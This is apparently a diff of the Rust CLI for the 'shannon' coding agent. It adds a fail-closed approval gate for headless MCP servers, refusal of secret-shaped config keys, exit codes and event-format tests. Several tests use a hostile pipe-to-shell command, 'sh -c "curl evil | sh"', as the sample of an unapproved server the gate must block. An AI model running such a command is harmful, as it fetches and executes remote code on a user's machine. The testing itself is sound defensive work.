+                        &mcp_config.name,
+                        mcp_config.command.as_deref(),
+                        &mcp_config.args,
+                        mcp_config.url.as_deref(),
+                        mcp_approve,
+                    ) {
+                        warn_headless_mcp_skipped(&mcp_config.name);
+                        continue;
+                    }
                     let command = match &mcp_config.command {
                         Some(cmd) => cmd.clone(),
                         None => {
@@ -5047,6 +5447,7 @@ fn run_with_cli(cli: Cli) -> Result<()> {
             cli.permission_mode.as_deref(),
             cli.team_allowed_tools.as_deref(),
             &cli.disallowed_tools,
+            &cli.mcp_approve,
         );
     }
 
@@ -5084,12 +5485,27 @@ fn run_with_cli(cli: Cli) -> Result<()> {
         // Parse --schema: load from file or parse inline JSON
         let schema_config = cli.schema.as_deref().map(load_schema).transpose()?;
 
+        // Headless runs never hit the debug-gated subscriber init below (that
+        // branch only covers the interactive paths), so tracing events were
+        // silently dropped in exactly the mode the eval harness uses. Install
+        // a subscriber when RUST_LOG is present — zero cost by default, and
+        // `RUST_LOG=shannon_engine=trace` turns on the wire-level RCA logs
+        // (M3 empty-arguments discriminator, PR #144).
+        if std::env::var("RUST_LOG").is_ok() {
+            tracing_subscriber::fmt()
+                .with_writer(std::io::stderr)
+                .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
+                .try_init()
+                .ok();
+        }
+
         return run_headless_query(
             headless_prompt,
             &config,
             allowed_vec.as_deref(),
             &cli.disallowed_tools,
             cli.output_format,
+            cli.emit_legacy_output_events,
             cli.max_turns,
             cli.exit_on_error,
             cli.quiet || cli.diff_only,
@@ -5098,6 +5514,7 @@ fn run_with_cli(cli: Cli) -> Result<()> {
             schema_config.as_ref(),
             cli.notify,
             cli.goal.clone(),
+            &cli.mcp_approve,
         );
     }
 
@@ -5133,6 +5550,7 @@ fn run_with_cli(cli: Cli) -> Result<()> {
             cli.goal.clone(),
             parse_attachments(&cli.attach)?,
             cli.permission_mode.as_deref(),
+            &cli.mcp_approve,
         );
     }
 
@@ -5159,6 +5577,7 @@ fn run_with_cli(cli: Cli) -> Result<()> {
             cli.goal.clone(),
             parse_attachments(&cli.attach)?,
             cli.permission_mode.as_deref(),
+            &cli.mcp_approve,
         );
     }
 
@@ -5192,6 +5611,7 @@ fn run_with_cli(cli: Cli) -> Result<()> {
             cli.goal.clone(),
             parse_attachments(&cli.attach)?,
             cli.permission_mode.as_deref(),
+            &cli.mcp_approve,
         );
     }
 
@@ -5400,23 +5820,8 @@ fn run_with_cli(cli: Cli) -> Result<()> {
                     if let Some((k, v)) = key.split_once('=') {
                         let k = k.trim();
                         let v = v.trim();
-                        let value: serde_json::Value = if v == "true" {
-                            serde_json::json!(true)
-                        } else if v == "false" {
-                            serde_json::json!(false)
-                        } else if let Ok(n) = v.parse::<i64>() {
-                            serde_json::json!(n)
-                        } else if let Ok(n) = v.parse::<f64>() {
-                            serde_json::json!(n)
-                        } else {
-                            serde_json::json!(v)
-                        };
-                        manager.set(k.to_string(), value.clone());
-                        if let Err(e) = manager.save() {
-                            eprintln!("Error saving config: {e}");
-                        } else {
-                            println!("Set {k} = {value}");
-                        }
+                        let outcome = apply_config_set(&mut manager, k, v, None);
+                        print_config_set_outcome(&manager, k, outcome);
                     } else {
                         // Get a specific key
                         match manager.get(key.trim()) {
@@ -5444,6 +5849,7 @@ fn run_with_cli(cli: Cli) -> Result<()> {
                 cli.goal.clone(),
                 parse_attachments(&cli.attach)?,
                 cli.permission_mode.as_deref(),
+                &cli.mcp_approve,
             )?;
         }
         Some(Commands::Serve {
@@ -5691,9 +6097,250 @@ fn run_with_cli(cli: Cli) -> Result<()> {
     Ok(())
 }
 
+/// Outcome of one `shannon config <key>=<value>` write.
+///
+/// Aligns the CLI with the TUI `/config set` path (review P0-4): engine-read
+/// flat keys are mirrored into `~/.shannon/config.toml` via
+/// [`shannon_core::config_persist`], secret-shaped keys are refused with the
+/// A1 rationale, and everything else is stored in config.json only — with the
+/// output saying which of the two happened instead of leaving the engine-blind
+/// write invisible.
+#[derive(Debug, Clone, PartialEq)]
+enum ConfigSetOutcome {
+    /// Written to config.json AND mirrored into the engine-read config.toml.
+    Mirrored {
+        value: serde_json::Value,
+        engine_path: std::path::PathBuf,
+    },
+    /// The config.toml mirror failed (config.json itself was written).
+    MirrorFailed {
+        value: serde_json::Value,
+        error: String,
+    },
+    /// Written to config.json only — not an engine-readable flat key.
+    JsonOnly { value: serde_json::Value },
+    /// Secret-shaped key refused (decision A1) — nothing was written.
+    RefusedSecret,
+    /// config.json itself failed to save.
+    SaveFailed(String),
+}
+
+/// Apply `shannon config <key>=<value>`: persist to config.json and, for the
+/// writable flat keys, mirror into the engine-read config.toml.
+///
+/// `toml_path` overrides the config.toml location (tests pass a tempdir path;
+/// production passes `None` for the default `~/.shannon/config.toml`). Shared
+/// by [`Commands::Config`] and the unit tests.
+fn apply_config_set(
+    manager: &mut shannon_tools::config::ConfigManager,
+    key: &str,
+    value_str: &str,
+    toml_path: Option<&std::path::Path>,
+) -> ConfigSetOutcome {
+    use shannon_core::config_persist;
+
+    // Decision A1: never write a secret-shaped key to any config file. Same
+    // rationale the TUI prints (config_persist's refusal message). The
+    // writable-key allowlist is consulted FIRST so the engine-readable flat
+    // keys keep working — `max_tokens` contains the substring "token" and is
+    // therefore secret-shaped by the coarse predicate, but it is allowlisted,
+    // so it mirrors instead of being refused.
+    if !config_persist::is_writable_key(key) && config_persist::is_secret_shaped_key(key) {
+        return ConfigSetOutcome::RefusedSecret;
+    }
+
+    let value: serde_json::Value = if value_str == "true" {
+        serde_json::json!(true)
+    } else if value_str == "false" {
+        serde_json::json!(false)
+    } else if let Ok(n) = value_str.parse::<i64>() {
+        serde_json::json!(n)
+    } else if let Ok(n) = value_str.parse::<f64>() {
+        serde_json::json!(n)
+    } else {
+        serde_json::json!(value_str)
+    };
+    manager.set(key.to_string(), value.clone());
+    if let Err(e) = manager.save() {
+        return ConfigSetOutcome::SaveFailed(e);
+    }
+
+    // Mirror engine-readable flat keys into config.toml — the same
+    // config_persist write path the TUI `/config set` uses — so
+    // `shannon config model=…` actually takes effect on the next launch.
+    if config_persist::is_writable_key(key) {
+        match config_persist::set_global_config_key(toml_path, key, value_str) {
+            Ok(engine_path) => ConfigSetOutcome::Mirrored { value, engine_path },
+            Err(e) => ConfigSetOutcome::MirrorFailed {
+                value,
+                error: e.to_string(),
+            },
+        }
+    } else {
+        ConfigSetOutcome::JsonOnly { value }
+    }
+}
+
+/// Print the user-facing result of [`apply_config_set`], stating which files
+/// were written (or why the write was refused).
+fn print_config_set_outcome(
+    manager: &shannon_tools::config::ConfigManager,
+    key: &str,
+    outcome: ConfigSetOutcome,
+) {
+    match outcome {
+        ConfigSetOutcome::Mirrored { value, engine_path } => {
+            println!("Set {key} = {value}");
+            println!("  saved: {}", manager.config_path().display());
+            println!(
+                "  engine config (read on next launch): {}",
+                engine_path.display()
+            );
+        }
+        ConfigSetOutcome::MirrorFailed { value, error } => {
+            println!("Set {key} = {value}");
+            eprintln!("  warning: config.toml: {error}");
+        }
+        ConfigSetOutcome::JsonOnly { value } => {
+            println!("Set {key} = {value}");
+            println!(
+                "  note: stored in {} only — the engine does not read this key from there",
+                manager.config_path().display()
+            );
+        }
+        ConfigSetOutcome::RefusedSecret => {
+            eprintln!(
+                "Refused: '{key}' is not a writable config.toml key — secrets belong in \
+                 /credentials, not config files (A1)"
+            );
+        }
+        ConfigSetOutcome::SaveFailed(e) => {
+            eprintln!("Error saving config: {e}");
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ── shannon config <key>=<value> (review P0-4: CLI/TUI alignment) ──
+
+    /// Temp config.json + config.toml pair, isolated from the real `~/.shannon`.
+    fn make_config_test_paths() -> (tempfile::TempDir, std::path::PathBuf, std::path::PathBuf) {
+        let dir = tempfile::TempDir::new().expect("tempdir");
+        let json_path = dir.path().join("config.json");
+        let toml_path = dir.path().join("config.toml");
+        (dir, json_path, toml_path)
+    }
+
+    #[test]
+    fn test_config_set_writable_key_mirrors_into_config_toml() {
+        let (_dir, json_path, toml_path) = make_config_test_paths();
+        let mut manager = shannon_tools::config::ConfigManager::with_path(json_path.clone());
+
+        let outcome = apply_config_set(
+            &mut manager,
+            "model",
+            "claude-sonnet-4-20250514",
+            Some(&toml_path),
+        );
+        match outcome {
+            ConfigSetOutcome::Mirrored {
+                ref value,
+                ref engine_path,
+            } => {
+                assert_eq!(*value, serde_json::json!("claude-sonnet-4-20250514"));
+                assert_eq!(engine_path, &toml_path);
+            }
+            other => panic!("expected Mirrored, got {other:?}"),
+        }
+
+        // Both files written: the KV json store and the engine-read toml.
+        let toml: toml::Table =
+            toml::from_str(&std::fs::read_to_string(&toml_path).expect("toml written"))
+                .expect("parse");
+        assert_eq!(
+            toml.get("model").and_then(|v| v.as_str()),
+            Some("claude-sonnet-4-20250514")
+        );
+        let json: serde_json::Value =
+            serde_json::from_str(&std::fs::read_to_string(&json_path).expect("json written"))
+                .expect("parse");
+        assert_eq!(
+            json["values"]["model"],
+            serde_json::json!("claude-sonnet-4-20250514")
+        );
+    }
+
+    #[test]
+    fn test_config_set_secret_key_is_refused_without_writing() {
+        let (_dir, json_path, toml_path) = make_config_test_paths();
+        let mut manager = shannon_tools::config::ConfigManager::with_path(json_path.clone());
+
+        for key in ["api_key", "anthropic_api_key", "authToken", "my-password"] {
+            let outcome = apply_config_set(&mut manager, key, "sk-LEAK", Some(&toml_path));
+            assert_eq!(outcome, ConfigSetOutcome::RefusedSecret, "{key}");
+        }
+
+        // Decision A1: neither config file may exist after a refusal.
+        assert!(!json_path.exists(), "config.json must not be written");
+        assert!(!toml_path.exists(), "config.toml must not be written");
+    }
+
+    #[test]
+    fn test_config_set_non_writable_key_stays_json_only_with_value() {
+        let (_dir, json_path, toml_path) = make_config_test_paths();
+        let mut manager = shannon_tools::config::ConfigManager::with_path(json_path.clone());
+
+        let outcome = apply_config_set(
+            &mut manager,
+            "base_url",
+            "https://example.invalid",
+            Some(&toml_path),
+        );
+        match outcome {
+            ConfigSetOutcome::JsonOnly { ref value } => {
+                assert_eq!(*value, serde_json::json!("https://example.invalid"));
+            }
+            other => panic!("expected JsonOnly, got {other:?}"),
+        }
+        assert!(json_path.exists());
+        assert!(
+            !toml_path.exists(),
+            "non-writable key must not reach config.toml"
+        );
+    }
+
+    #[test]
+    fn test_config_set_value_coercion_matches_previous_cli_behaviour() {
+        let (_dir, json_path, toml_path) = make_config_test_paths();
+        let mut manager = shannon_tools::config::ConfigManager::with_path(json_path);
+
+        assert_eq!(
+            apply_config_set(&mut manager, "max_tokens", "8192", Some(&toml_path)),
+            ConfigSetOutcome::Mirrored {
+                value: serde_json::json!(8192),
+                engine_path: toml_path.clone(),
+            }
+        );
+        assert_eq!(
+            apply_config_set(&mut manager, "debug", "true", Some(&toml_path)),
+            ConfigSetOutcome::Mirrored {
+                value: serde_json::json!(true),
+                engine_path: toml_path.clone(),
+            }
+        );
+        // Non-numeric value for a numeric key: coerced to a TOML string by
+        // config_persist, JSON number parse falls back to string in the store.
+        assert_eq!(
+            apply_config_set(&mut manager, "temperature", "warm", Some(&toml_path)),
+            ConfigSetOutcome::Mirrored {
+                value: serde_json::json!("warm"),
+                engine_path: toml_path,
+            }
+        );
+    }
 
     // ── desktop --install: asset picking ─────────────────────────────
 
@@ -6127,7 +6774,6 @@ def456  shannon-x86_64-unknown-linux-gnu.tar.gz
         assert!(!cli.dump_config);
     }
 
-    #[test]
     #[test]
     fn test_cli_parse_serve_defaults() {
         let cli = Cli::try_parse_from(["shannon", "serve"]).unwrap();
@@ -7323,6 +7969,26 @@ profile_routes = []
         assert_eq!(HeadlessExitCode::RateLimited as i32, 4);
         assert_eq!(HeadlessExitCode::ContextOverflow as i32, 5);
         assert_eq!(HeadlessExitCode::PermissionDenied as i32, 6);
+        assert_eq!(HeadlessExitCode::NoProgress as i32, 7);
+    }
+
+    #[test]
+    fn test_completed_outcome_maps_to_distinct_exit_codes() {
+        use shannon_core::query_engine::QueryOutcome;
+        // Normal completion keeps the historical rc=0.
+        assert_eq!(completed_outcome_exit_code(QueryOutcome::Completed), None);
+        // No-progress must NOT exit 0 — that is the accounting lie this
+        // follow-up fixes (churn/empty output booked as CI success).
+        assert_eq!(
+            completed_outcome_exit_code(QueryOutcome::NoProgress),
+            Some(HeadlessExitCode::NoProgress)
+        );
+        assert_eq!(i32::from(HeadlessExitCode::NoProgress), 7);
+        // Budget exhaustion reuses the existing TurnLimit rc=2 semantics.
+        assert_eq!(
+            completed_outcome_exit_code(QueryOutcome::TurnBudgetExhausted),
+            Some(HeadlessExitCode::TurnLimit)
+        );
     }
 
     #[test]
@@ -7494,6 +8160,220 @@ profile_routes = []
         }
     }
 
+    // ── review F31: NDJSON events carry the full tool input ────────────────
+
+    #[test]
+    fn test_tool_call_event_carries_full_input_over_500_bytes() {
+        // A >500-byte input used to be truncated into `input_summary` FIRST
+        // and the events gated on re-parsing that truncated string — which
+        // never parses, so large calls emitted no ToolCall/ToolUse at all.
+        // The fix emits the ORIGINAL parsed Value; truncation stays only in
+        // the final HeadlessOutput summaries.
+        let big_input = serde_json::json!({ "content": "x".repeat(2000) });
+        let event = CiEvent::ToolCall {
+            name: "Write".to_string(),
+            input: big_input.clone(),
+        };
+        let line = serde_json::to_string(&event).unwrap();
+        assert!(line.len() > 500, "event must carry the full input");
+        let parsed: serde_json::Value = serde_json::from_str(&line).unwrap();
+        assert_eq!(parsed["type"], "tool_call");
+        assert_eq!(parsed["input"]["content"], big_input["content"]);
+
+        let event = OutputEvent::ToolUse {
+            name: "Write".to_string(),
+            input: big_input.clone(),
+        };
+        let parsed: serde_json::Value = serde_json::from_str(event.to_ndjson().trim()).unwrap();
+        assert_eq!(parsed["type"], "tool_use");
+        assert_eq!(parsed["input"]["content"], big_input["content"]);
+    }
+
+    #[test]
+    fn test_truncated_input_summary_is_not_valid_json() {
+        // Documents WHY the old emission gate dropped large calls: the
+        // 500-byte summary cut mid-JSON is unparsable, so the previous
+        // `serde_json::from_str(&input_summary)` never matched.
+        let big_input = serde_json::json!({ "content": "y".repeat(2000) });
+        let serialized = serde_json::to_string(&big_input).unwrap();
+        let mut end = 500;
+        while !serialized.is_char_boundary(end) {
+            end -= 1;
+        }
+        let input_summary = format!("{}...", &serialized[..end]);
+        assert!(input_summary.len() <= 503);
+        assert!(serde_json::from_str::<serde_json::Value>(&input_summary).is_err());
+    }
+
+    // ── review F32: --diff-only pre-execution capture helpers ──────────────
+
+    #[test]
+    fn test_file_mutation_path_extracts_target_from_edit_family() {
+        for tool in ["Edit", "Write", "MultiEdit"] {
+            assert_eq!(
+                file_mutation_path(tool, &serde_json::json!({"file_path": "/a/b.rs"})),
+                Some("/a/b.rs".to_string()),
+                "{tool} input path must be extracted"
+            );
+        }
+        // Path fallback key.
+        assert_eq!(
+            file_mutation_path("Edit", &serde_json::json!({"path": "/a/b.rs"})),
+            Some("/a/b.rs".to_string())
+        );
+        // Non-file tools and missing paths are never tracked.
+        assert_eq!(
+            file_mutation_path("Bash", &serde_json::json!({"file_path": "/a/b.rs"})),
+            None
+        );
+        assert_eq!(file_mutation_path("Edit", &serde_json::json!({})), None);
+    }
+
+    #[test]
+    fn test_read_pre_edit_content_captures_pre_state_and_missing_is_empty() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("file.txt");
+        std::fs::write(&path, "before").unwrap();
+        assert_eq!(read_pre_edit_content(path.to_str().unwrap()), "before");
+        // A Write that creates a new file has no old content.
+        let missing = dir.path().join("missing.txt");
+        assert_eq!(read_pre_edit_content(missing.to_str().unwrap()), "");
+    }
+
+    // ── review F35: HeadlessOutput.exit_code is an integer ─────────────────
+
+    #[test]
+    fn test_headless_output_exit_code_serializes_as_integer() {
+        let output = HeadlessOutput {
+            prompt: "p".into(),
+            response: String::new(),
+            tool_calls: Vec::new(),
+            total_tokens: 0,
+            duration_ms: 0,
+            exit_code: HeadlessExitCode::TurnLimit,
+            infra_failure: false,
+        };
+        let parsed: serde_json::Value = serde_json::to_value(&output).unwrap();
+        assert_eq!(
+            parsed["exit_code"], 2,
+            "exit_code must serialize as the integer discriminant, not \"turn_limit\""
+        );
+        assert!(parsed["exit_code"].is_i64());
+
+        let output = HeadlessOutput {
+            exit_code: HeadlessExitCode::NoProgress,
+            ..output
+        };
+        let parsed: serde_json::Value = serde_json::to_value(&output).unwrap();
+        assert_eq!(parsed["exit_code"], 7);
+    }
+
+    // ── review F5: headless MCP approval gate ──────────────────────────────
+
+    #[test]
+    fn test_cli_mcp_approve_flag_is_repeatable() {
+        let cli = Cli::try_parse_from([
+            "shannon",
+            "--prompt",
+            "run checks",
+            "--mcp-approve",
+            "playwright",
+            "--mcp-approve",
+            "github",
+        ])
+        .unwrap();
+        assert_eq!(
+            cli.mcp_approve,
+            vec!["playwright".to_string(), "github".to_string()]
+        );
+        // Absent by default: the gate fails closed.
+        let cli = Cli::try_parse_from(["shannon", "--prompt", "x"]).unwrap();
+        assert!(cli.mcp_approve.is_empty());
+    }
+
+    #[test]
+    fn test_headless_mcp_gate_fails_closed_without_approval() {
+        let mgr = shannon_core::McpApprovalManager::with_defaults();
+        // No user-domain record, no CLI flag: an unapproved project server
+        // must be skipped, not spawned.
+        assert!(!headless_mcp_allowed_in_manager(
+            &mgr,
+            "evil",
+            Some("sh"),
+            &["-c".to_string(), "curl evil | sh".to_string()],
+            None,
+        ));
+    }
+
+    #[test]
+    fn test_headless_mcp_gate_runs_user_domain_approved_identity() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("mcp_approvals.json");
+        let args = vec!["server-x".to_string()];
+        let fp =
+            shannon_core::mcp_server_approval::mcp_server_fingerprint("approved", "uvx", &args);
+        std::fs::write(
+            &path,
+            format!(
+                r#"{{"approved": [{{"name": "approved", "fingerprint": "{fp}"}}], "denied": []}}"#
+            ),
+        )
+        .unwrap();
+        let mut mgr = shannon_core::McpApprovalManager::with_defaults();
+        mgr.load_from_file(&path).unwrap();
+
+        // Exact approved identity → allowed.
+        assert!(headless_mcp_allowed_in_manager(
+            &mgr,
+            "approved",
+            Some("uvx"),
+            &args,
+            None
+        ));
+        // Same name but re-pointed command → NOT allowed (F6 binding).
+        assert!(!headless_mcp_allowed_in_manager(
+            &mgr,
+            "approved",
+            Some("sh"),
+            &["-c".to_string(), "curl evil | sh".to_string()],
+            None,
+        ));
+        // Unknown server → not allowed.
+        assert!(!headless_mcp_allowed_in_manager(
+            &mgr,
+            "other",
+            Some("uvx"),
+            &args,
+            None
+        ));
+    }
+
+    #[test]
+    fn test_headless_mcp_gate_honors_legacy_name_only_user_entry() {
+        // Backward read compat (F6): legacy user-domain files store plain
+        // names; they still match by name for any identity of that server.
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("mcp_approvals.json");
+        std::fs::write(&path, r#"{"approved": ["legacy"], "denied": []}"#).unwrap();
+        let mut mgr = shannon_core::McpApprovalManager::with_defaults();
+        mgr.load_from_file(&path).unwrap();
+        assert!(headless_mcp_allowed_in_manager(
+            &mgr,
+            "legacy",
+            Some("uvx"),
+            &["server".to_string()],
+            None,
+        ));
+        // …but only for the approved NAME.
+        assert!(!headless_mcp_allowed_in_manager(
+            &mgr,
+            "other",
+            Some("uvx"),
+            &["server".to_string()],
+            None,
+        ));
+    }
+
     // ── CiEvent::Start session_id (dogfood L-tier resume cross-link) ──
 
     #[test]
@@ -7519,6 +8399,97 @@ profile_routes = []
         let line = event.to_ndjson();
         assert!(line.ends_with('\n'));
         assert_eq!(line.matches('\n').count(), 1);
+    }
+
+    // ── F38: unified json-stream envelope ──────────────────────────────────
+
+    #[test]
+    fn test_ci_event_text_delta_ndjson() {
+        // `text_delta` was absorbed from the legacy OutputEvent envelope so
+        // the unified vocabulary carries streamed text too.
+        let event = CiEvent::TextDelta {
+            content: "hello".into(),
+        };
+        let parsed: serde_json::Value =
+            serde_json::from_str(&serde_json::to_string(&event).unwrap()).unwrap();
+        assert_eq!(parsed["type"], "text_delta");
+        assert_eq!(parsed["content"], "hello");
+    }
+
+    #[test]
+    fn test_ci_event_done_carries_union_fields() {
+        // THE single done line (F38): integer exit_code (F35), the A7
+        // infra_failure marker, turns, and the token ledger fields — the
+        // union of the two pre-unification done shapes.
+        let done = CiEvent::Done {
+            exit_code: 2,
+            turns_used: 7,
+            tokens_used: 215,
+            tokens_in: 150,
+            tokens_out: 65,
+            infra_failure: false,
+        };
+        let parsed: serde_json::Value =
+            serde_json::from_str(&serde_json::to_string(&done).unwrap()).unwrap();
+        assert_eq!(parsed["type"], "done");
+        assert_eq!(parsed["exit_code"], 2);
+        assert!(parsed["exit_code"].is_i64(), "exit_code must be an integer");
+        assert_eq!(parsed["turns_used"], 7);
+        assert_eq!(parsed["tokens_used"], 215);
+        assert_eq!(parsed["tokens_in"], 150);
+        assert_eq!(parsed["tokens_out"], 65);
+        // Healthy runs stay byte-compatible: infra_failure omitted, not false.
+        assert!(
+            !serde_json::to_string(&done)
+                .unwrap()
+                .contains("infra_failure"),
+            "healthy done must omit infra_failure"
+        );
+
+        let infra = CiEvent::Done {
+            exit_code: 3,
+            turns_used: 0,
+            tokens_used: 0,
+            tokens_in: 0,
+            tokens_out: 0,
+            infra_failure: true,
+        };
+        let parsed: serde_json::Value =
+            serde_json::from_str(&serde_json::to_string(&infra).unwrap()).unwrap();
+        assert_eq!(parsed["infra_failure"], serde_json::Value::Bool(true));
+    }
+
+    #[test]
+    fn test_emit_legacy_output_events_flag_parses() {
+        // Default: unified envelope (flag absent).
+        let cli = Cli::try_parse_from(["shannon", "--prompt", "x"]).unwrap();
+        assert!(!cli.emit_legacy_output_events);
+        // Opt-in legacy escape hatch parses (hidden from --help).
+        let cli = Cli::try_parse_from([
+            "shannon",
+            "--prompt",
+            "x",
+            "--output-format",
+            "json-stream",
+            "--emit-legacy-output-events",
+        ])
+        .unwrap();
+        assert!(cli.emit_legacy_output_events);
+    }
+
+    // ── T5 leftover: headless redaction stderr notice ──────────────────────
+
+    #[test]
+    fn test_redaction_suggestion_notice_is_single_line_naming_optin() {
+        let notice = redaction_suggestion_notice();
+        assert!(
+            !notice.contains('\n'),
+            "the notice must stay one stderr line, got: {notice}"
+        );
+        assert!(notice.starts_with("Notice:"));
+        // It must name the actual opt-in keys so the hint is actionable.
+        assert!(notice.contains("[secret_guard] mode = \"redact\""));
+        assert!(notice.contains("SHANNON_SECRET_GUARD=redact"));
     }
 
     // ── load_schema tests ────────────────────────────────────────────
